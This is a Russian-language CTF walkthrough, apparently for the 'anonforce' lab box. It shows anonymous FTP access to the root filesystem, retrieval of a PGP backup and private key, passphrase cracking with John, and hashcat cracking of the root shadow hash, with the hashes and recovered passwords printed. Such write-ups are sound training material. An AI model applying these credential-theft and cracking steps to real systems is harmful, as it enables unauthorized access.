Открыты два порта, ftp на 21 и ssh на 22.

![](../images/Pasted%20image%2020260513200621.png)

Также второе сканирование показало, что доступен анонимный вход в ftp и там огромное количество файлов для изучения.
Переходим туда.

![](../images/Pasted%20image%2020260513200948.png)

Это открытый корневой каталог. Посмотрим кто существует из пользователей.

![](../images/Pasted%20image%2020260513201233.png)

Отлично, находим имя пользователя 
```
melodias
```

Также флаг user.txt, который прочитаем в дальнейшем, права позволяют.
Скачиваем также другие файлы в директории.

Из всех файлов самый интересный .wget-hsts, всё остальное стандартное
```
└─$ cat .wget-hsts               
# HSTS 1.0 Known Hosts database for GNU Wget.
# Edit at your own risk.
# <hostname>[:<port>]   <incl. subdomains>      <created>       <max-age>
gist.githubusercontent.com      0       0       1565570405      31536000
```

На этом этапе я пересмотрел какие файлы и директории доступны для ftp и увидел директорию, которая называется notread, а внутри файл, судя по всему бэкап.

```
ftp> ls -la
229 Entering Extended Passive Mode (|||51409|)
150 Here comes the directory listing.
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 .
drwxr-xr-x   23 0        0            4096 Aug 11  2019 ..
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
```

Скачиваем файлы. Первый файл - это зашифрованный файл бэкапа, а второе - приватный ключ для шифрования и расшифровки файлов, которые созданы с его помощью. Мы можем использовать ключ для расшифровки бэкапа, но для этого необходим пароль.

Через jhon брутим пароль для ключа.
```
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)     
1g 0:00:00:00 DONE (2026-05-13 20:44) 7.692g/s 7153p/s 7153c/s 7153C/s xbox360..sheena
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Теперь, мы можем расшифровать бэкап.

Расшифрованный файл - это файл с паролями.
```
└─$ cat decrypted.txt 
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::      
```

Теперь выбираем пользователя melodias и его хэш и надо сбрутить этот пароль.
```
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1
```

Попытки сломать хэш ничем не закончились и тут я увидел, что и у root пользователя есть хэш, скорее всего его надо сломать!

```
$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:hikari
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycI...b5RVM0
Time.Started.....: Wed May 13 22:18:17 2026, (1 sec)
Time.Estimated...: Wed May 13 22:18:18 2026, (0 secs)
Kernel.Feature...: Optimized Kernel (password length 0-15 bytes)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    34056 H/s (82.40ms) @ Accel:64 Loops:1024 Thr:16 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14342/14344385 (0.10%)
Rejected.........: 6/14342 (0.04%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> billybob1
Hardware.Mon.#01.: Temp: 56c Util:100% Core:1785MHz Mem:6000MHz Bus:16
Started: Wed May 13 22:17:59 2026
Stopped: Wed May 13 22:18:19 2026
```

Отлично, всё получилось. Заходим в систему и читаем рут флаг.

![](../images/Pasted%20image%2020260513222221.png)

